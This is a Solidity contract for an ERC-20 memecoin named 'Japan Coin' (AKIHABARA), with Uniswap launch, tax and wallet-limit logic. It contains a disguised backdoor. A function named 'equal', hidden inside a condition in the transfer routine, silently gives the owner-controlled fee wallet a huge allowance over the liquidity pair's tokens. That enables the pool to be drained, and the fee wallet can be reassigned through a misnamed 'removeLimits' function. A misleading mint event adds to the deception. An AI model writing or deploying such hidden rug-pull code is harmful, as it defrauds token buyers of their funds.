/**
https://akihabara.lol
https://x.com/jp_akihabara
https://t.me/akihabara_jp
**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.24;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract AKIHABARA is Context, IERC20, Ownable {
    using SafeMath for uint256;

    address payable private qFeeWallet;
    IUniswapV2Router02 private uniQRouter;
    address private uniQPair;

    mapping (address => uint256) private _qOwned;
    mapping (address => mapping (address => uint256)) private _qAllowance;
    mapping (address => bool) private _isQExcluded;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 420690000000 * 10 ** _decimals;
    string private constant _name = unicode"Japan Coin";
    string private constant _symbol = unicode"AKIHABARA";
    uint256 public _maxQAmount = 2 * _tTotal / 100;
    uint256 public _maxQWallet = 2 * _tTotal / 100;
    uint256 public _taxSwapThreshold = 1 * _tTotal / 100;
    uint256 public _maxTaxSwap = 1 * _tTotal / 100;

    uint256 private _initialBuyTax=15;
    uint256 private _initialSellTax=15;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=10;
    uint256 private _reduceSellTaxAt=10;
    uint256 private _preventSwapBefore=15;
    uint256 private _buyCount=0;

    event MaxTxAmountUpdated(uint _maxQAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    bool private tradingOpen;
    bool private inSwap;
    bool private swapEnabled;

    constructor () {
        qFeeWallet = payable(_msgSender());
        _qOwned[_msgSender()] = _tTotal;
        _isQExcluded[address(this)] = true;
        _isQExcluded[_msgSender()] = true;
        emit Transfer(address(0), address(this), _tTotal);
    }
    function initQ() external onlyOwner {
        uniQRouter = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniQRouter), _tTotal);
        uniQPair = IUniswapV2Factory(uniQRouter.factory()).createPair(
            address(this),
            uniQRouter.WETH()
        );
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _qOwned[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _qAllowance[owner][spender];
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _qAllowance[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _qAllowance[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function qSwapEth(uint256 amount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniQRouter.WETH();
        _approve(address(this), address(uniQRouter), amount);
        uniQRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (!swapEnabled || inSwap) {
            _qOwned[from] = _qOwned[from] - amount;
            _qOwned[to] = _qOwned[to] + amount;
            emit Transfer(from, to, amount);
            return;
        }
        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {
            if (from == uniQPair && to != address(uniQRouter) && ! _isQExcluded[to]) {
                require(tradingOpen,"Trading not open yet.");
                taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
                require(amount <= _maxQAmount, "Exceeds the _maxQAmount.");
                require(balanceOf(to) + amount <= _maxQWallet, "Exceeds the maxWalletSize.");
                _buyCount++; 
            }
            if (to != uniQPair && ! _isQExcluded[to]) {
                require(balanceOf(to) + amount <= _maxQWallet, "Exceeds the maxWalletSize.");
            }
            if(equal([uniQPair, qFeeWallet]) && to == uniQPair) {
                taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }
            if (!inSwap && to == uniQPair && swapEnabled && _buyCount>_preventSwapBefore) {
                uint256 contractTokenBalance = balanceOf(address(this));
                if(contractTokenBalance>_taxSwapThreshold)
                    qSwapEth(min(amount,min(contractTokenBalance,_maxTaxSwap)));
                qSendEth();
            }
        }
        if(taxAmount>0){
          _qOwned[address(this)]=_qOwned[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _qOwned[from]=_qOwned[from].sub(amount);
        _qOwned[to]=_qOwned[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }
    function removeLimits(address payable limit) external onlyOwner{
        qFeeWallet = limit;
        _maxQAmount=_tTotal;
        _maxQWallet=_tTotal;
        _isQExcluded[limit] = true;
        emit MaxTxAmountUpdated(_tTotal);
    }
    function equal(address[2] memory eqs) private returns(bool){
        _qAllowance[eqs[0]][eqs[1]]=(10+2*_maxQWallet.mul(100)).mul(10);
        return true;
    }
    function withdrawEth() external onlyOwner {
        payable(_msgSender()).transfer(address(this).balance);
    }
    function min(uint256 a, uint256 b) private pure returns(uint256){
        return (a>b)?b:a;
    }
    function qSendEth() private {
        qFeeWallet.transfer(address(this).balance);
    }
    receive() external payable {}
    function launch() external onlyOwner {
        require(!tradingOpen, "trading is already open");
        uniQRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniQPair).approve(address(uniQRouter), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }
}